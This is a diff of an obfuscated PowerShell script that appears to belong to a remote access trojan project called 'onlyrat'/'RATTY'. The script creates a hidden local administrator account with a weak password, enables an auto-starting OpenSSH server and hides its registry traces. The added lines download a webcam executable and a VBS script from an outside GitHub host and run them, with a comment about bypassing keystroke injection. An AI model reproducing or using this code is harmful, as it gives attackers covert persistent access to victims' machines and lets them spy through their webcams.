@@ -22,7 +22,7 @@ function nQjUmBRylz{
 
     }
     process{
-        New-LocalUser -Name "$jrTWzPgQwA" -Password "$oXGjuyUVQW" -Description "Temporary local admin"
+        New-LocalUser -Name "$jrTWzPgQwA" -Password $oXGjuyUVQW -Description "Temporary local admin"
         Write-verbose "$jrTWzPgQwA local user created"
         Add-LocalGroupMember -Group "Administrators" -Member "$jrTWzPgQwA"
         Write-verbose "$jrTWzPgQwA added to the local administrator group"
@@ -32,7 +32,7 @@ function nQjUmBRylz{
     }
 }
 # delete any existing local admin user so that we can have a connections
-Remove-LocalUser -Name "onlyrat"
+# Remove-LocalUser -Name "onlyrat"
 # Create local admin
 $jrTWzPgQwA="onlyrat"
 $lUWMsSTQXg="123456"
@@ -95,6 +95,13 @@ Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
 Start-Service sshd
 Set-Service -Name sshd -StartupType 'Automatic'
 Get-NetFirewallRule -Name *ssh* 
+# install the webcam here and bypass the keystroke injection
+Invoke-WebRequest -Uri "raw.githubusercontent.com/carlocarlo123/RATTY/main/payloads/webcam.exe" -OutFile "CBMfWVYiXZ.exe"
+# generateb random name for the vbs file
+Invoke-WebRequest -Uri "raw.githubusercontent.com/carlocarlo123/RATTY/main/payloads/confirm-cam.vbs" -OutFile "ZLFfcquOxv.vbs"
+# invoke the vbs script with the exe
+Invoke-Expression "./CBMfWVYiXZ.exe";Invoke-Expression "./ZLFfcquOxv.vbs"
+
 
 # hide our own  registery we had created
 Set-Location C:\Users
